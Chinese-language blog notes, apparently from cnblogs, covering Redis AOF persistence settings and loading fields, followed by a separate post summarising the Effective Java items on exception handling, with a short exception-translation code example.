loading_loaded_bytes: Number of bytes already loaded.已经加载的文件的大小。
loading_loaded_perc: Same value expressed as a percentage. 已经加载的比例。
loading_eta_seconds: ETA in seconds for the load to be complete. 预计多久加载完毕。
 
AOF的相关参数

appendonly yes
appendfilename "appendonly.aof"

appendfsync everysec

no-appendfsync-on-rewrite no

auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb

aof-load-truncated yes

aof-use-rdb-preamble no

其中，
no-appendfsync-on-rewrite：在执行bgsave或bgrewriteaof操作时，不调用fsync()操作，此时，Redis的持久化策略相当于"appendfsync none"。
aof-load-truncated：在Redis节点启动的时候，如果发现AOF文件已经损坏了，其处理逻辑与该参数的设置有关，若为yes，则会忽略掉错误，尽可能加载较多的数据，若为no，则会直接报错退出。默认为yes。需要注意的是，该参数只适用于Redis启动阶段，如果在Redis运行过程中，发现AOF文件corrupted，Redis会直接报错退出。
aof-use-rdb-preamble：是否启用Redis 4.x提供的AOF+RDB的混合持久化方案，若为yes，在重写AOF文件时，Redis会将数据以RDB的格式作为AOF文件的开始部分。在重写之后，Redis会继续以AOF格式持久化写入操作。默认值为no。
 
参考：
1. 《Redis开发与运维》
2. 《Redis设计与实现》
3. 《Redis 4.X Cookbook》
********************************************************************************************************************************************************************************************************
《Effective Java》学习笔记 ——异常
 
　　充分发挥异常的优点，可以提高程序的可读性、可靠性和可维护性。
 
第57条 只针对异常的情况才使用异常
 
第58条 对可恢复的情况使用受检异常，对编程错误使用运行时异常
　　* 如果期望调用者能够适当的恢复，使用受检异常。
　　* 大多数的运行时异常都表示前提违例（precondition violation），如ArrayIndexOutOfBoundsException。
　　* 错误往往被JVM保留用于表示资源不足、约束失败，或其他无法继续执行的条件。最好不要再实现任何新的Error子类。
 
第59条 避免不必要的使用受检的异常
　
第60条 优先使用标准的异常
　　* 常用异常：IllegalArgumentException、IllegalStatusException、NullPointerException、IndexOutOfBoundsException、ConcurrentModificationException、UnsupportedOperationException等。
 
第61条 抛出与异常相对于的异常
　　* 更高层的实现应该捕获底层的异常，同时抛出可以按照高层抽象进行解释的异常。这种做法被称为异常转义（exception translation），如AbstractSequentialList类的例子：

1     public E get(int index) {
2         try {
3             return listIterator(index).next();
4         } catch (NoSuchElementException exc) {
5             throw new IndexOutOfBoundsException("Index: "+index);
6         }
7     }

　　* 也可以使用异常链（exception chaining）的形式来进行转义，即将底层的异常作为参数传入高层异常。
 
第62条 每个方法抛出的异常都要有文档
　　* 始终要单独的声明受检异常，并利用Javadoc的@throws标记准确的记录下抛出异常的每个条件。
　　* 如果一个类的许多方法出于同样的原因而抛出同一个异常，在该类的文档注释中对这个异常建立文档，是可以接受的。
 
第63条 在细节消息中包含能捕获失败的信息
 
第64条 努力使失败保持原子性
　　* 一般而言，失败的方法调用应该使对象保持在被调用之前的状态。具有这种属性的方法被称为具有失败原子性（failure atomic）。
　　* 获得失败原子性的方法：
　　　　（1）在执行操作之前检查参数的有效性。
　　　　（2）调整计算处理过程的顺序，是的任何可能会失败的计算部分都在对象状态被修改前发生。
　　　　（3）编写一段恢复代码（不常用）。
　　　　（4）在对象的一份临时拷贝上执行操作，当操作完成后在用临时拷贝中的结果代替对象的内容。
 
第65条 不要忽略异常
　　* 至少，catch块也应该包含一条说明，解释为什么可以忽略这个异常。
 
 
本文地址：https://www.cnblogs.com/laishenghao/p/effective_java_note_exception.html
 
********************************************************************************************************************************************************************************************************
